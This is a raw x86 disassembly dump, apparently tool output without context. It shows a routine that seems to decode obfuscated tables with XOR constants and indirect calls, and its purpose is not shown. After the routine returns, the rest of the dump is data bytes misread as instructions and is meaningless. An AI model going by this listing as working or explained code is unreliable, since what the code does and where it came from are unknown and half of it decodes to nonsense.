  43609f:	push   0x1e4ed287
  4360a4:	add    esi,0x12694
  4360aa:	call   ebp
  4360ac:	mov    ecx,DWORD PTR ds:0x448028
  4360b2:	mov    edx,0x3e
  4360b7:	jmp    0x4360c0
  4360b9:	lea    esp,[esp+0x0]
  4360c0:	movzx  eax,WORD PTR [ecx+0x6]
  4360c4:	movzx  ecx,WORD PTR [ecx]
  4360c7:	shl    eax,0x10
  4360ca:	add    eax,ecx
  4360cc:	mov    ecx,DWORD PTR ds:0x448d1c
  4360d2:	xor    ecx,eax
  4360d4:	mov    ds:0x448d10,eax
  4360d9:	xor    ecx,0xe96501b1
  4360df:	mov    DWORD PTR [esi],ecx
  4360e1:	mov    ecx,DWORD PTR ds:0x448028
  4360e7:	movzx  eax,BYTE PTR [ecx+0xe]
  4360eb:	movzx  edi,BYTE PTR [ecx+0xa]
  4360ef:	movzx  ecx,WORD PTR [ecx+0x8]
  4360f3:	shl    eax,0x8
  4360f6:	add    eax,edi
  4360f8:	shl    eax,0x10
  4360fb:	add    eax,ecx
  4360fd:	mov    ds:0x448d10,eax
  436102:	mov    ecx,0xe965023d
  436107:	sub    ecx,DWORD PTR ds:0x448d1c
  43610d:	xor    ecx,eax
  43610f:	mov    DWORD PTR [esi+0x4],ecx
  436112:	mov    ecx,DWORD PTR ds:0x448028
  436118:	add    ecx,0x10
  43611b:	mov    DWORD PTR ds:0x448028,ecx
  436121:	movzx  eax,WORD PTR [ecx+0x6]
  436125:	movzx  ecx,WORD PTR [ecx]
  436128:	shl    eax,0x10
  43612b:	add    eax,ecx
  43612d:	mov    ecx,DWORD PTR ds:0x448d1c
  436133:	xor    ecx,eax
  436135:	mov    ds:0x448d10,eax
  43613a:	xor    ecx,0xe96501b1
  436140:	mov    DWORD PTR [esi+0x8],ecx
  436143:	mov    ecx,DWORD PTR ds:0x448028
  436149:	movzx  eax,BYTE PTR [ecx+0xe]
  43614d:	movzx  edi,BYTE PTR [ecx+0xa]
  436151:	movzx  ecx,WORD PTR [ecx+0x8]
  436155:	shl    eax,0x8
  436158:	add    eax,edi
  43615a:	shl    eax,0x10
  43615d:	add    eax,ecx
  43615f:	mov    ds:0x448d10,eax
  436164:	mov    ecx,0xe965023d
  436169:	sub    ecx,DWORD PTR ds:0x448d1c
  43616f:	xor    ecx,eax
  436171:	mov    DWORD PTR [esi+0xc],ecx
  436174:	mov    ecx,DWORD PTR ds:0x448028
  43617a:	add    ecx,0x10
  43617d:	mov    DWORD PTR ds:0x448028,ecx
  436183:	movzx  eax,WORD PTR [ecx+0x6]
  436187:	movzx  ecx,WORD PTR [ecx]
  43618a:	shl    eax,0x10
  43618d:	add    eax,ecx
  43618f:	mov    ecx,DWORD PTR ds:0x448d1c
  436195:	xor    ecx,eax
  436197:	mov    ds:0x448d10,eax
  43619c:	xor    ecx,0xe96501b1
  4361a2:	mov    DWORD PTR [esi+0x10],ecx
  4361a5:	mov    ecx,DWORD PTR ds:0x448028
  4361ab:	movzx  eax,BYTE PTR [ecx+0xe]
  4361af:	movzx  edi,BYTE PTR [ecx+0xa]
  4361b3:	movzx  ecx,WORD PTR [ecx+0x8]
  4361b7:	shl    eax,0x8
  4361ba:	add    eax,edi
  4361bc:	shl    eax,0x10
  4361bf:	add    eax,ecx
  4361c1:	mov    ecx,0xe965023d
  4361c6:	sub    ecx,DWORD PTR ds:0x448d1c
  4361cc:	mov    ds:0x448d10,eax
  4361d1:	xor    ecx,eax
  4361d3:	mov    DWORD PTR [esi+0x14],ecx
  4361d6:	mov    ecx,DWORD PTR ds:0x448028
  4361dc:	add    ecx,0x10
  4361df:	mov    DWORD PTR ds:0x448028,ecx
  4361e5:	movzx  eax,WORD PTR [ecx+0x6]
  4361e9:	movzx  ecx,WORD PTR [ecx]
  4361ec:	shl    eax,0x10
  4361ef:	add    eax,ecx
  4361f1:	mov    ecx,DWORD PTR ds:0x448d1c
  4361f7:	mov    ds:0x448d10,eax
  4361fc:	xor    ecx,eax
  4361fe:	xor    ecx,0xe96501b1
  436204:	mov    DWORD PTR [esi+0x18],ecx
  436207:	mov    ecx,DWORD PTR ds:0x448028
  43620d:	movzx  eax,BYTE PTR [ecx+0xe]
  436211:	movzx  edi,BYTE PTR [ecx+0xa]
  436215:	movzx  ecx,WORD PTR [ecx+0x8]
  436219:	shl    eax,0x8
  43621c:	add    eax,edi
  43621e:	shl    eax,0x10
  436221:	add    eax,ecx
  436223:	mov    ds:0x448d10,eax
  436228:	mov    ecx,0xe965023d
  43622d:	sub    ecx,DWORD PTR ds:0x448d1c
  436233:	add    esi,0x30
  436236:	xor    ecx,eax
  436238:	mov    DWORD PTR [esi-0x14],ecx
  43623b:	mov    ecx,DWORD PTR ds:0x448028
  436241:	add    ecx,0x10
  436244:	mov    DWORD PTR ds:0x448028,ecx
  43624a:	movzx  eax,WORD PTR [ecx+0x6]
  43624e:	movzx  ecx,WORD PTR [ecx]
  436251:	shl    eax,0x10
  436254:	add    eax,ecx
  436256:	mov    ecx,DWORD PTR ds:0x448d1c
  43625c:	xor    ecx,eax
  43625e:	mov    ds:0x448d10,eax
  436263:	xor    ecx,0xe96501b1
  436269:	mov    DWORD PTR [esi-0x10],ecx
  43626c:	mov    ecx,DWORD PTR ds:0x448028
  436272:	movzx  eax,BYTE PTR [ecx+0xe]
  436276:	movzx  edi,BYTE PTR [ecx+0xa]
  43627a:	movzx  ecx,WORD PTR [ecx+0x8]
  43627e:	shl    eax,0x8
  436281:	add    eax,edi
  436283:	shl    eax,0x10
  436286:	add    eax,ecx
  436288:	mov    ds:0x448d10,eax
  43628d:	mov    ecx,0xe965023d
  436292:	sub    ecx,DWORD PTR ds:0x448d1c
  436298:	xor    ecx,eax
  43629a:	mov    DWORD PTR [esi-0xc],ecx
  43629d:	mov    ecx,DWORD PTR ds:0x448028
  4362a3:	add    ecx,0x10
  4362a6:	mov    DWORD PTR ds:0x448028,ecx
  4362ac:	movzx  eax,WORD PTR [ecx+0x6]
  4362b0:	movzx  ecx,WORD PTR [ecx]
  4362b3:	shl    eax,0x10
  4362b6:	add    eax,ecx
  4362b8:	mov    ecx,DWORD PTR ds:0x448d1c
  4362be:	xor    ecx,eax
  4362c0:	mov    ds:0x448d10,eax
  4362c5:	xor    ecx,0xe96501b1
  4362cb:	mov    DWORD PTR [esi-0x8],ecx
  4362ce:	mov    ecx,DWORD PTR ds:0x448028
  4362d4:	movzx  eax,BYTE PTR [ecx+0xe]
  4362d8:	movzx  edi,BYTE PTR [ecx+0xa]
  4362dc:	movzx  ecx,WORD PTR [ecx+0x8]
  4362e0:	shl    eax,0x8
  4362e3:	add    eax,edi
  4362e5:	shl    eax,0x10
  4362e8:	add    eax,ecx
  4362ea:	mov    ecx,0xe965023d
  4362ef:	sub    ecx,DWORD PTR ds:0x448d1c
  4362f5:	mov    ds:0x448d10,eax
  4362fa:	xor    ecx,eax
  4362fc:	mov    DWORD PTR [esi-0x4],ecx
  4362ff:	mov    ecx,DWORD PTR ds:0x448028
  436305:	add    ecx,0x10
  436308:	dec    edx
  436309:	mov    DWORD PTR ds:0x448028,ecx
  43630f:	jne    0x4360c0
  436315:	mov    esi,DWORD PTR ds:0x448d20
  43631b:	add    esi,0x13234
  436321:	mov    edi,0x13c
  436326:	lea    edx,[esp+0x10]
  43632a:	push   edx
  43632b:	lea    eax,[esp+0x1c]
  43632f:	push   eax
  436330:	lea    ecx,[esp+0x30]
  436334:	push   ecx
  436335:	lea    edx,[esp+0x2c]
  436339:	push   edx
  43633a:	push   0x1e4ed287
  43633f:	call   ebp
  436341:	mov    ecx,DWORD PTR ds:0x44802c
  436347:	movzx  eax,BYTE PTR [ecx+0x5]
  43634b:	movzx  edx,BYTE PTR [ecx+0x2]
  43634f:	movzx  ecx,WORD PTR [ecx]
  436352:	shl    eax,0x8
  436355:	add    eax,edx
  436357:	shl    eax,0x10
  43635a:	add    eax,ecx
  43635c:	mov    edx,0x11eb1e72
  436361:	sub    edx,DWORD PTR ds:0x448d1c
  436367:	mov    ds:0x448d10,eax
  43636c:	xor    edx,eax
  43636e:	lea    eax,[esp+0x10]
  436372:	push   eax
  436373:	lea    ecx,[esp+0x1c]
  436377:	push   ecx
  436378:	mov    DWORD PTR [esi],edx
  43637a:	lea    edx,[esp+0x30]
  43637e:	push   edx
  43637f:	lea    eax,[esp+0x2c]
  436383:	push   eax
  436384:	push   0x1e4ed287
  436389:	call   ebp
  43638b:	mov    ecx,DWORD PTR ds:0x44802c
  436391:	movzx  eax,BYTE PTR [ecx+0xd]
  436395:	movzx  edx,WORD PTR [ecx+0xb]
  436399:	movzx  ecx,BYTE PTR [ecx+0x7]
  43639d:	shl    eax,0x10
  4363a0:	add    eax,edx
  4363a2:	shl    eax,0x8
  4363a5:	add    eax,ecx
  4363a7:	mov    edx,0x11eb1e72
  4363ac:	sub    edx,DWORD PTR ds:0x448d1c
  4363b2:	mov    ds:0x448d10,eax
  4363b7:	xor    edx,eax
  4363b9:	mov    DWORD PTR [esi+0x4],edx
  4363bc:	mov    ecx,DWORD PTR ds:0x44802c
  4363c2:	add    ecx,0x10
  4363c5:	add    esi,0x8
  4363c8:	dec    edi
  4363c9:	mov    DWORD PTR ds:0x44802c,ecx
  4363cf:	jne    0x436326
  4363d5:	movzx  eax,BYTE PTR [ecx+0x5]
  4363d9:	movzx  edx,BYTE PTR [ecx+0x2]
  4363dd:	movzx  ecx,WORD PTR [ecx]
  4363e0:	shl    eax,0x8
  4363e3:	add    eax,edx
  4363e5:	mov    edx,DWORD PTR ds:0x448d1c
  4363eb:	shl    eax,0x10
  4363ee:	add    eax,ecx
  4363f0:	add    edx,0x11e31aa6
  4363f6:	xor    edx,eax
  4363f8:	mov    ds:0x448d10,eax
  4363fd:	lea    eax,[esp+0x10]
  436401:	push   eax
  436402:	mov    DWORD PTR [esi],edx
  436404:	mov    esi,DWORD PTR ds:0x448d20
  43640a:	lea    ecx,[esp+0x1c]
  43640e:	push   ecx
  43640f:	lea    edx,[esp+0x30]
  436413:	push   edx
  436414:	lea    eax,[esp+0x2c]
  436418:	push   eax
  436419:	push   0x1e4ed287
  43641e:	add    esi,0x13c18
  436424:	call   ebp
  436426:	mov    ebx,DWORD PTR ds:0x445050
  43642c:	mov    ecx,DWORD PTR ds:0x448030
  436432:	mov    edi,0x17c
  436437:	jmp    0x436440
  436439:	lea    esp,[esp+0x0]
  436440:	movzx  eax,WORD PTR [ecx+0x6]
  436444:	movzx  edx,BYTE PTR [ecx+0x3]
  436448:	movzx  ecx,BYTE PTR [ecx+0x1]
  43644c:	shl    eax,0x8
  43644f:	add    eax,edx
  436451:	mov    edx,DWORD PTR ds:0x448d1c
  436457:	shl    eax,0x8
  43645a:	add    eax,ecx
  43645c:	mov    ds:0x448d10,eax
  436461:	add    edx,0x7ce5e752
  436467:	xor    edx,eax
  436469:	mov    DWORD PTR [esi],edx
  43646b:	mov    ecx,DWORD PTR ds:0x448030
  436471:	movzx  eax,BYTE PTR [ecx+0xf]
  436475:	movzx  edx,BYTE PTR [ecx+0xd]
  436479:	movzx  ecx,WORD PTR [ecx+0xa]
  43647d:	shl    eax,0x8
  436480:	add    eax,edx
  436482:	shl    eax,0x10
  436485:	add    eax,ecx
  436487:	mov    edx,0x7cedeb1e
  43648c:	sub    edx,DWORD PTR ds:0x448d1c
  436492:	mov    ds:0x448d10,eax
  436497:	xor    edx,eax
  436499:	push   0x100
  43649e:	lea    eax,[esp+0x44]
  4364a2:	push   eax
  4364a3:	mov    DWORD PTR [esi+0x4],edx
  4364a6:	push   0x447a88
  4364ab:	add    esi,0x8
  4364ae:	call   ebx
  4364b0:	mov    ecx,DWORD PTR ds:0x448030
  4364b6:	add    ecx,0x10
  4364b9:	dec    edi
  4364ba:	mov    DWORD PTR ds:0x448030,ecx
  4364c0:	jne    0x436440
  4364c6:	lea    ecx,[esp+0x10]
  4364ca:	push   ecx
  4364cb:	lea    edx,[esp+0x1c]
  4364cf:	push   edx
  4364d0:	lea    eax,[esp+0x30]
  4364d4:	push   eax
  4364d5:	lea    ecx,[esp+0x2c]
  4364d9:	push   ecx
  4364da:	push   0x1e4ed287
  4364df:	call   ebp
  4364e1:	mov    ecx,DWORD PTR ds:0x448030
  4364e7:	movzx  eax,WORD PTR [ecx+0x6]
  4364eb:	movzx  edx,BYTE PTR [ecx+0x3]
  4364ef:	movzx  ecx,BYTE PTR [ecx+0x1]
  4364f3:	shl    eax,0x8
  4364f6:	add    eax,edx
  4364f8:	mov    edx,DWORD PTR ds:0x448d1c
  4364fe:	shl    eax,0x8
  436501:	add    eax,ecx
  436503:	add    edx,0x7ce5e752
  436509:	xor    edx,eax
  43650b:	mov    ds:0x448d10,eax
  436510:	mov    DWORD PTR [esi],edx
  436512:	mov    ecx,DWORD PTR ds:0x448d20
  436518:	mov    edx,DWORD PTR ds:0x448034
  43651e:	add    ecx,0x14e58
  436524:	mov    esi,0xad
  436529:	lea    esp,[esp+0x0]
  436530:	movzx  eax,WORD PTR [edx+0x4]
  436534:	movzx  edx,WORD PTR [edx+0x1]
  436538:	shl    eax,0x10
  43653b:	add    eax,edx
  43653d:	mov    ds:0x448d10,eax
  436542:	mov    edx,0x5cac56a9
  436547:	sub    edx,DWORD PTR ds:0x448d1c
  43654d:	add    ecx,0x8
  436550:	xor    edx,eax
  436552:	mov    DWORD PTR [ecx-0x8],edx
  436555:	mov    edx,DWORD PTR ds:0x448034
  43655b:	movzx  eax,WORD PTR [edx+0xe]
  43655f:	movzx  edx,WORD PTR [edx+0x9]
  436563:	shl    eax,0x10
  436566:	add    eax,edx
  436568:	mov    edx,DWORD PTR ds:0x448d1c
  43656e:	xor    edx,eax
  436570:	xor    edx,0x5cac5525
  436576:	mov    ds:0x448d10,eax
  43657b:	mov    DWORD PTR [ecx-0x4],edx
  43657e:	mov    edx,DWORD PTR ds:0x448034
  436584:	add    edx,0x10
  436587:	dec    esi
  436588:	mov    DWORD PTR ds:0x448034,edx
  43658e:	jne    0x436530
  436590:	mov    eax,DWORD PTR [esp+0x30]
  436594:	mov    esi,DWORD PTR ds:0x44502c
  43659a:	test   eax,eax
  43659c:	je     0x4365a1
  43659e:	push   eax
  43659f:	call   esi
  4365a1:	mov    eax,DWORD PTR [esp+0x38]
  4365a5:	test   eax,eax
  4365a7:	je     0x4365ac
  4365a9:	push   eax
  4365aa:	call   esi
  4365ac:	mov    eax,DWORD PTR [esp+0x3c]
  4365b0:	test   eax,eax
  4365b2:	je     0x4365b7
  4365b4:	push   eax
  4365b5:	call   esi
  4365b7:	mov    eax,DWORD PTR [esp+0x34]
  4365bb:	test   eax,eax
  4365bd:	je     0x4365c2
  4365bf:	push   eax
  4365c0:	call   esi
  4365c2:	pop    edi
  4365c3:	pop    esi
  4365c4:	pop    ebp
  4365c5:	pop    ebx
  4365c6:	mov    esp,ebp
  4365c8:	pop    ebp
  4365c9:	ret    
  4365ca:	int3   
  4365cb:	int3   
  4365cc:	int3   
  4365cd:	int3   
  4365ce:	int3   
  4365cf:	int3   
  4365d0:	add    bh,bh
  4365d2:	mov    DWORD PTR [ebx+0x66ff9d0b],eax
  4365d8:	jmp    0xa90465dd
  4365dd:	sub    DWORD PTR [ebx+0x1],0x0
  4365e1:	mov    DWORD PTR [ecx-0x76a19701],ecx
  4365e7:	fnsave [ecx-0x5d030100]
  4365ed:	inc    DWORD PTR [esi-0xff7602]
  4365f3:	int3   
  4365f4:	mov    es,WORD PTR [esi]
  4365f6:	sub    DWORD PTR [ebp-0x55000093],0x31
  4365fd:	(bad)  
  4365fe:	clc    
  4365ff:	push   ecx
  436600:	(bad)  
  436601:	inc    DWORD PTR [eax]
  436603:	dec    DWORD PTR [esi]
  436605:	jle    0x436590
  436607:	rol    BYTE PTR ds:0x24500ff,1
  43660d:	add    BYTE PTR [esp+eax*8-0x1],al
  436611:	add    BYTE PTR [eax],al
  436613:	dec    DWORD PTR [ecx]
  436615:	mov    BYTE PTR [eax],al
  436617:	sub    edx,DWORD PTR [edi+edi*8]
  43661a:	call   edi
  43661c:	pushf  
  43661d:	add    bh,cl
  43661f:	mov    BYTE PTR [ecx-0x4d33ff7d],cl
  436625:	ret    0xadff
  436628:	mov    esi,0xeacd8300
  43662d:	dec    ecx
  43662f:	xchg   ebx,eax
  436630:	add    DWORD PTR [eax],0x0
  436633:	int3   
  436634:	mov    bh,0x19
  436636:	add    BYTE PTR [esi],ch
  436638:	pop    ebp
  436639:	add    bh,bh
  43663b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43663c:	inc    ebx
  43663d:	add    BYTE PTR [eax-0x2b],al
  436640:	inc    DWORD PTR [eax]
  436642:	(bad)  
  436643:	jmp    eax
  436645:	dec    edx
  436646:	call   DWORD PTR [esi+ecx*4]
  436649:	inc    DWORD PTR [eax]
  43664b:	add    DWORD PTR [esi+0xbf7d89],0xffffffff
  436652:	add    BYTE PTR [eax],al
  436654:	push   eax
  436655:	adc    eax,DWORD PTR [eax]
  436657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436658:	pop    ds
  436659:	or     esp,0x32
  43665c:	sahf   
  43665d:	mov    ecx,esi
  43665f:	imul   eax,DWORD PTR [eax],0x300ff00
  436665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436666:	sub    DWORD PTR [edi-0x19ff00b9],0xfffffff6
  43666d:	dec    DWORD PTR [ecx]
  43666f:	repz (bad) 
  436671:	inc    DWORD PTR [eax]
  436673:	xor    DWORD PTR [edx],0x1f
  436676:	add    BYTE PTR [edi-0xd],ah
  436679:	inc    DWORD PTR [eax]
  43667b:	sub    bl,ch
  43667d:	add    al,cl
  43667f:	rol    BYTE PTR [eax],0xff
  436682:	dec    DWORD PTR [ecx+0x2d83cda6]
  436688:	push   esp
  436689:	mov    DWORD PTR [ebx-0x3e000fb8],eax
  43668f:	pop    DWORD PTR [eax]
  436691:	dec    esp
  436693:	call   DWORD PTR [eax+0x2b0dcc9c]
  436699:	inc    DWORD PTR [eax]
  43669b:	add    al,0x26
  43669d:	add    BYTE PTR [edx+0x33],bh
  4366a0:	(bad)  
  4366a1:	(bad)  
  4366a2:	dec    esp
  4366a4:	inc    ebx
  4366a5:	repnz add BYTE PTR [ebp-0x67],dh
  4366a9:	dec    esp
  4366ab:	cwde   
  4366ac:	call   0xff8da2b0
  4366b1:	add    BYTE PTR [eax],al
  4366b3:	inc    DWORD PTR [edx+0x2449ff17]
  4366b9:	add    BYTE PTR [eax],al
  4366bb:	test   eax,0xebb0ff3a
  4366c0:	add    bh,bh
  4366c2:	cmp    edi,0xffffffeb
  4366c5:	mov    edx,0x83bf40ff
  4366ca:	call   FWORD PTR [esi]
  4366cc:	sub    eax,0x5264ff
  4366d1:	add    bh,bh
  4366d3:	add    ch,bh
  4366d5:	stos   DWORD PTR es:[edi],eax
  4366d6:	jmp    DWORD PTR [ebx+0x7083000f]
  4366dc:	push   ds
  4366dd:	dec    DWORD PTR [edx-0x7600ff21]
  4366e3:	mov    DWORD PTR [esi],esi
  4366e5:	stos   DWORD PTR es:[edi],eax
  4366e6:	or     DWORD PTR [esi+ebx*1],0xffffffcc
  4366ea:	call   esp
  4366ec:	jge    0x4366ed
  4366ee:	ja     0x4366b7
  4366f0:	add    BYTE PTR [ebx-0x557b0100],al
  4366f6:	(bad)  
  4366f7:	jnp    0x43667b
  4366f9:	(bad)  
  4366fa:	call   esp
  4366fc:	adc    cl,BYTE PTR [ecx-0xffcc9c]
  436702:	add    bh,bh
  436704:	stos   BYTE PTR es:[edi],al
  436705:	pop    ds
  436706:	or     DWORD PTR [eax+eax*2+0x3885ff00],0xffffff83
  43670e:	in     al,0x64
  436710:	add    bh,bh
  436712:	dec    DWORD PTR [ecx-0x6d001db0]
  436718:	xor    al,0xff
  43671a:	jmp    DWORD PTR [ecx]
  43671c:	xor    al,BYTE PTR [eax]
  43671e:	into   
  43671f:	(bad)  
  436721:	dec    esp
  436723:	dec    DWORD PTR [esi+0x7a]
  436726:	cmp    DWORD PTR [esp+esi*1+0x0],0xffffffff
  43672b:	inc    edi
  43672c:	sti    
  43672d:	int3   
  43672e:	xchg   ebp,eax
  43672f:	adc    al,BYTE PTR [eax]
  436731:	add    BYTE PTR [eax],al
  436733:	add    dl,ch
  436735:	retf   0x4700
  436738:	and    eax,0xa0e5ccff
  43673d:	dec    DWORD PTR [ebx+0x8]
  436740:	inc    DWORD PTR [eax]
  436742:	dec    DWORD PTR [ecx-0x79ffc561]
  436748:	add    eax,0x8d15ff00
  43674d:	call   FWORD PTR [edx-0x76ff0096]
  436753:	int3   
  436754:	mov    ch,0x44
  436756:	int3   
  436757:	sub    dl,dl
  436759:	mov    edi,edi
  43675b:	cmp    BYTE PTR [ebp+0x0],dl
  43675e:	sar    DWORD PTR [edx-0x7cff0001],cl
  436764:	jbe    0x436748
  436766:	int3   
  436767:	in     eax,0xb3
  436769:	(bad)  
  43676a:	call   DWORD PTR [esp+ebx*8-0x1]
  43676e:	popa   
  43676f:	mov    bl,0x0
  436771:	inc    DWORD PTR [eax]
  436773:	add    ah,bl
  436775:	or     BYTE PTR [eax],al
  436777:	pop    esi
  436778:	mov    esp,0x393700cc
  43677d:	call   FWORD PTR [ecx-0x3300005b]
  436783:	add    BYTE PTR [ecx+0x6d3aff3b],ah
  436789:	dec    DWORD PTR [ecx-0x7833f019]
  43678f:	ret    
  436790:	(bad)  
  436791:	dec    DWORD PTR [ecx-0x7c03b77d]
  436797:	imul   ecx,DWORD PTR [esi-0x1],0x83322eff
  43679e:	sbb    DWORD PTR [ecx],esi
  4367a0:	(bad)  
  4367a1:	inc    DWORD PTR [eax]
  4367a3:	jmp    DWORD PTR [edx]
  4367a5:	arpl   WORD PTR [eax],ax
  4367a7:	inc    ecx
  4367a8:	sar    edi,cl
  4367aa:	add    BYTE PTR [eax],cl
  4367ac:	jmp    0x4367ad
  4367ae:	mov    ah,0xa
  4367b0:	inc    DWORD PTR [eax]
  4367b2:	inc    DWORD PTR [eax]
  4367b4:	push   eax
  4367b5:	adc    al,0xff
  4367b7:	sahf   
  4367b8:	repnz mov edi,edi
  4367bb:	inc    eax
  4367bc:	xchg   ecx,eax
  4367bd:	add    BYTE PTR [edi-0xff000e],al
  4367c3:	jmp    DWORD PTR [edx-0x63a80086]
  4367c9:	mov    DWORD PTR [eax],eax
  4367cb:	xor    DWORD PTR [edi+edi*8-0x7c1f2b],edi
  4367d2:	or     esp,0x42
  4367d5:	xchg   edi,eax
  4367d6:	call   FWORD PTR [ebp+0x4c]
  4367d9:	add    BYTE PTR [eax],al
  4367db:	dec    esi
  4367dc:	jle    0x4367dd
  4367de:	push   esp
  4367df:	cmp    bh,bh
  4367e1:	int3   
  4367e2:	(bad)  
  4367e3:	inc    DWORD PTR [eax+0x15]
  4367e6:	(bad)  
  4367e7:	fdivr  st(1),st
  4367e9:	(bad)  
  4367ea:	inc    DWORD PTR [edx+ebp*1+0x0]
  4367ee:	dec    edi
  4367ef:	mov    cl,0x89
  4367f1:	int3   
  4367f2:	inc    DWORD PTR [eax]
  4367f4:	mov    ecx,0x7bf9ffd9
  4367f9:	add    bh,bh
  4367fb:	popa   
  4367fc:	xchg   edi,eax
  4367fd:	jmp    DWORD PTR [edx]
  4367ff:	cwde   
  436800:	(bad)  
  436801:	dec    DWORD PTR [ecx-0x7ce9d601]
  436807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436808:	cli    
  436809:	add    ah,cl
  43680b:	mov    BYTE PTR [ebx-0x5b0b7d],ah
  436811:	cmp    edi,0xffffffff
  436814:	jge    0x436886
  436816:	or     esi,0xffffff83
  436819:	inc    DWORD PTR [eax]
  43681b:	loope  0x436872
  43681d:	add    BYTE PTR [edi+0x4e],cl
  436820:	add    BYTE PTR [eax],al
  436822:	inc    DWORD PTR [eax]
  436824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436825:	nop
  436826:	int3   
  436827:	out    0x2a,al
  436829:	cmp    edi,0xfffffff4
  43682c:	adc    eax,DWORD PTR [ebx-0xffd4d0]
  436832:	cmp    edi,0xffffffc6
  436835:	nop
  436836:	jmp    FWORD PTR [edi-0x100ffe1]
  43683c:	imul   edi,edi,0xff004f61
  436842:	add    bh,bh
  436844:	dec    edx
  436845:	jle    0x4367d0
  436847:	and    al,BYTE PTR [ebx-0x3e7aff01]
  43684d:	(bad)  
  43684e:	fnstenv [edi]
  436850:	dec    esp
  436852:	add    DWORD PTR [eax],0xffffffc0
  436855:	pushf  
  436856:	add    ch,al
  436858:	jne    0x436859
  43685a:	(bad)  
  43685b:	cmp    DWORD PTR [eax-0x1],ebp
  43685e:	sti    
  43685f:	into   
  436860:	or     DWORD PTR [ecx+0x713a0083],0x0
  436867:	xchg   ah,dl
  436869:	inc    DWORD PTR [eax]
  43686b:	scas   al,BYTE PTR es:[edi]
  43686c:	mov    bl,0xcc
  43686e:	adc    al,0xa2
  436870:	int3   
  436871:	(bad)  
  436872:	inc    DWORD PTR [eax]
  436874:	icebp  
  436875:	rol    DWORD PTR [ebx-0x5363],cl
  43687b:	ins    BYTE PTR es:[edi],dx
  43687c:	out    0xff,al
  43687e:	mov    cl,0x13
  436880:	inc    DWORD PTR [eax]
  436882:	inc    DWORD PTR [eax]
  436884:	add    eax,0x291300a8
  436889:	add    bh,bh
  43688b:	xchg   edi,eax
  43688c:	xchg   edi,eax
  43688d:	add    BYTE PTR [edx+esi*8-0x1],dl
  436891:	dec    DWORD PTR [ecx+0xeb5600]
  436897:	xchg   edx,eax
  436898:	sar    bh,cl
  43689a:	jmp    DWORD PTR [ebx+0x73]
  43689d:	add    BYTE PTR [ebx-0x764b],ch
  4368a3:	(bad)  
  4368a4:	(bad)  
  4368a5:	stc    
  4368a6:	call   edx
  4368a8:	lods   eax,DWORD PTR ds:[esi]
  4368a9:	add    BYTE PTR [eax],al
  4368ab:	mov    esp,0xdc1b00ac
  4368b0:	add    DWORD PTR [eax],0xffffffff
  4368b3:	(bad)  
  4368b4:	jmp    0x43685e
  4368b6:	mov    esp,eax
  4368b8:	test   DWORD PTR [eax],eax
  4368ba:	add    BYTE PTR [ebp-0x5e],al
  4368bd:	dec    DWORD PTR [ecx-0x5a]
  4368c0:	inc    DWORD PTR [ebx+0x300800ff]
  4368c6:	add    ah,bl
  4368c8:	cdq    
  4368c9:	add    bh,bh
  4368cb:	enter  0xcc03,0x64
  4368cf:	call   0xff4468d3
  4368d4:	sbb    DWORD PTR [eax],esi
  4368d6:	inc    esi
  4368d8:	leave  
  4368d9:	add    DWORD PTR [eax],0xfffffffe
  4368dc:	jnp    0x436861
  4368de:	daa    
  4368df:	and    BYTE PTR [ebx-0x3f000001],al
  4368e5:	sub    bh,bh
  4368e7:	dec    esp
  4368e8:	aam    0x0
  4368ea:	call   DWORD PTR [edx]
  4368ec:	push   0xffffffff
  4368ee:	aaa    
  4368ef:	mov    bl,0xff
  4368f1:	cmp    edi,0x0
  4368f4:	mov    esi,0x8cb1ff45
  4368f9:	add    bh,bh
  4368fb:	xchg   ch,bl
  4368fd:	inc    DWORD PTR [edx-0x7c00ff3d]
  436903:	add    BYTE PTR [edx+edi*8],bh
  436906:	jmp    DWORD PTR [esp+ebp*1]
  436909:	(bad)  
  43690a:	call   DWORD PTR [ecx-0x6d]
  43690d:	add    BYTE PTR [edx],dh
  43690f:	jo     0x436911
  436911:	mov    DWORD PTR [ecx-0x3364ce7d],ecx
  436917:	pusha  
  436918:	inc    esp
  436919:	inc    DWORD PTR [eax]
  43691b:	dec    esp
  43691c:	xchg   edi,edi
  43691e:	adc    al,0x80
  436920:	inc    DWORD PTR [ebx-0x74e37677]
  436926:	dec    DWORD PTR [ecx+0x21ffff0f]
  43692c:	into   
  43692d:	or     DWORD PTR [ebx+0x898390],0xffffffff
  436934:	mov    bl,0x48
  436936:	sub    esi,0xffffff99
  436939:	(bad)  
  43693a:	call   DWORD PTR [ecx+0xf]
  43693d:	call   DWORD PTR [edi]
  43693f:	int    0xff
  436941:	add    bh,bh
  436943:	add    BYTE PTR [edi+0x25],cl
  436946:	mov    esp,eax
  436948:	jne    0x436949
  43694a:	(bad)  
  43694b:	jmp    0x50168f8
  436950:	inc    DWORD PTR [eax]
  436952:	(bad)  
  436953:	(bad)  
  436954:	jmp    0xffff:0xf9ee00ae
  43695b:	nop
  43695c:	add    al,0xff
  43695e:	lock adc al,0x0
  436961:	int3   
  436962:	(bad)  
  436963:	inc    esp
  436965:	add    BYTE PTR es:[ebp+ebx*4+0x66b18983],dl
  43696d:	call   FWORD PTR [eax+eax*4-0xffff7d]
  436974:	add    BYTE PTR [edi],ch
  436976:	mov    DWORD PTR [edi-0x12ffff17],edi
  43697c:	xlat   BYTE PTR ds:[ebx]
  43697d:	int3   
  43697e:	call   0x446908
  436983:	jmp    FWORD PTR [edx-0x3618002f]
  436989:	inc    DWORD PTR [eax]
  43698b:	jae    0x436a07
  43698d:	cmp    DWORD PTR [ebp+ebx*1-0x34],0xffffffff
  436992:	cmp    edi,0xffffffa0
  436995:	jecxz  0x436920
  436997:	(bad)  
  436998:	retf   
  436999:	or     esp,0xffffffae
  43699c:	adc    DWORD PTR gs:[esi-0x79],0xffffffcc
  4369a1:	int3   
  4369a2:	(bad)  
  4369a3:	jmp    FWORD PTR [esi]
  4369a5:	(bad)  
  4369a6:	push   DWORD PTR [ebp-0x72]
  4369a9:	add    bh,bh
  4369ab:	adc    ebx,DWORD PTR ds:0xa33b00
  4369b1:	inc    DWORD PTR [eax]
  4369b3:	jmp    DWORD PTR [ebp+0x25f883af]
  4369b9:	add    bh,bh
  4369bb:	ret    
  4369bc:	jb     0x4369be
  4369be:	scas   al,BYTE PTR es:[edi]
  4369bf:	ins    BYTE PTR es:[edi],dx
